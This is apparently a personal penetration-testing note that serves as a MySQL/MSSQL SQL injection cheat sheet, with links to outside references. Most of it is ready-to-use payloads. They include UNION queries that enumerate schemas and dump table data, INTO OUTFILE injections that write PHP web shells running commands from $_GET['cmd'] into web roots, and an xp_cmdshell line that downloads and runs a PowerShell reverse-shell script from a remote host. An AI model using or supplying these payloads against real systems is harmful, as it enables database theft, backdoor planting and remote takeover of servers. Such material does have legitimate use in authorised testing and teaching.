Check out:
https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/

https://www.exploit-db.com/papers/13650

[https://www.imperva.com/learn/application-security/sql-injection-sqli/](https://www.imperva.com/learn/application-security/sql-injection-sqli/)

![[Pasted image 20220712135953.png]]


Retrieve database version:
```SQL
UNION ALL SELECT NULL, version() -- -
```

List the databases:

```SQL
UNION ALL SELECT NULL, concat(schema_name) FROM information_schema.schemata -- -
```

Retrieve table names:

```SQL
UNION ALL SELECT NULL, concat(table_name) FROM information_schema.TABLES WHERE table_schema=database() -- -
```

Retrieve column names:

```SQL
UNION ALL SELECT NULL, concat(column_name) FROM information_schema.COLUMNS WHERE table_schema=database() -- -
```

Retrieve data:

```SQL
UNION ALL SELECT NULL, (0x28, column1, 0x3a, column2, 0x29) FROM table1 -- -
```

Retrieve data from different database:

```SQL
UNION ALL SELECT NULL, (0x28, column1, 0x3a, column2, 0x29) FROM databaseName.table1 -- -
```

#### Using INTO OUTFILE to create a malicious PHP file:
```SQL
http://$TARGET/debug.php?id=1 union all select 1,2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'
```

```SQL
http://$TARGET/debug.php?id=1 UNION SELECT '<?php echo shell_exec($_GET[\'cmd\']); ?>', null INTO OUTFILE '/var/www/cmd.php' #
```

```SQL
' UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/command.php'  -- -' 
```

#### Windows box cmdshell trick:
```SQL
xp_cmdshell "powershell -IEX(New-Object Net.WebClient).DownloadString('http://$TARGET/Invoke-PowerShellTcp.ps1')"
```